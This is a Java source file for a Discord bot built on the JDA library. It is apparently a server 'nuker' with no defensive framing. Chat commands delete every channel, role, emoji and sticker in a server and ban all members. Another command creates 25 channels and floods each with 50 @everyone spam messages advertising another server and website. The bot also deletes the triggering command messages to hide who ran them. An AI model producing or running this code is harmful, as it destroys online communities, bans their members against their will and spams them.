package wtf.gun.maou;

import io.github.cdimascio.dotenv.Dotenv;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import net.dv8tion.jda.api.utils.cache.CacheFlag;
import org.jetbrains.annotations.NotNull;

import java.io.FileNotFoundException;
import java.util.Random;
import java.io.File;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

public final class Bot {

    private final Dotenv config;

    public Bot() throws InterruptedException {
        config = Dotenv.configure().load();
        String token = config.get("TOKEN");
        // Input bot token
        JDA jda = JDABuilder.createDefault(token)
                // Set activity of bot
                .setActivity(Activity.watching("VALORANT"))
                .setChunkingFilter(ChunkingFilter.ALL)
                .setMemberCachePolicy(MemberCachePolicy.ALL)
                .enableCache(CacheFlag.FORUM_TAGS)
                .enableIntents(GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT, GatewayIntent.GUILD_MEMBERS)
                // Initialize commands
                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Rolez())
                .build()
                .awaitReady();
    }

    public Dotenv getConfig() {
        return config;
    }

    // Create x channels and spam message x times in each channel
    private static final class Create extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!hi")) return;
            Guild guild = event.getGuild();

            // For loop to create channels
            for (int i = 0; i < 25; i++) {
                guild.createTextChannel("gg-1hunna").queue(textChannel -> {
                    // For loop to spam message in channels
                    for (int j = 0; j < 50; j++) {
                        try {
                            textChannel.sendMessage("@everyone" +
                                    "\n" +
                                    "/1\uD835\uDD8D\uD835\uDD9A\uD835\uDD93\uD835\uDD93\uD835\uDD86 is an upcoming Community Server, giving back to the community hosting Nitro, PayPal & more prizes in Giveaways." +
                                    "\n" +
                                    "Discord: discord.gg/1hunna" +
                                    "\n" +
                                    "Website: https://1hunna.club").queue();
                        } catch (Exception ignored) {
                        }
                    }
                });
            }
            event.getMessage().delete().queue();
        }
    }

    // Create x roles
    private static final class Rolez extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!rolez")) return;
            Guild guild = event.getGuild();

            Random random = new Random();
            int color = random.nextInt();
            int colors = color + random.nextInt();

            // For loop to create roles
            for (int i = 0; i < 10; i++) {
                guild.createRole().setName("BEAMED").setColor(colors).queue(role -> role.createCopy());
            }
            event.getMessage().delete().queue();
        }
    }

    // Delete all channels, emojis, stickers, roles, ban all members
    private static final class Nuke extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!yeet")) return;
            Guild guild = event.getGuild();

            guild.getChannels().forEach(guildChannel -> guildChannel.delete().queue());
            guild.getEmojis().forEach(richCustomEmoji -> richCustomEmoji.delete().queue());
            guild.getStickers().forEach(guildSticker -> guildSticker.delete().queue());
            guild.getRoles().forEach(role -> {
                try {
                    role.delete().queue();
                } catch (Exception ignored) {

                }
            });
            guild.getMembers().forEach(member -> {
                try {
                    member.ban(0, TimeUnit.SECONDS).queue();
                } catch (Exception ignored) {

                }
            });
            event.getMessage().delete().queue();
        }
    }

    // Delete all emojis and stickers
    private static final class Emoji extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nomoji")) return;
            Guild guild = event.getGuild();

            guild.getEmojis().forEach(richCustomEmoji -> richCustomEmoji.delete().queue());
            guild.getStickers().forEach(guildSticker -> guildSticker.delete().queue());
            event.getMessage().delete().queue();
        }
    }

    // Delete all channels
    private static final class Channel extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nochan")) return;
            Guild guild = event.getGuild();

            guild.getChannels().forEach(guildChannel -> guildChannel.delete().queue());
            event.getMessage().delete().queue();
        }
    }

    // Delete all roles
    private static final class Role extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!norole")) return;
            Guild guild = event.getGuild();

            guild.getRoles().forEach(role -> {
                try {
                    role.delete().queue();
                } catch (Exception ignored) {

                }
            });
            event.getMessage().delete().queue();
        }
    }

    // Ban all memebrs
    private static final class Member extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nomem")) return;
            Guild guild = event.getGuild();

            guild.getMembers().forEach(member -> {
                try {
                    member.ban(0, TimeUnit.SECONDS).queue();
                } catch (Exception ignored) {

                }
            });
            event.getMessage().delete().queue();
        }
    }

}
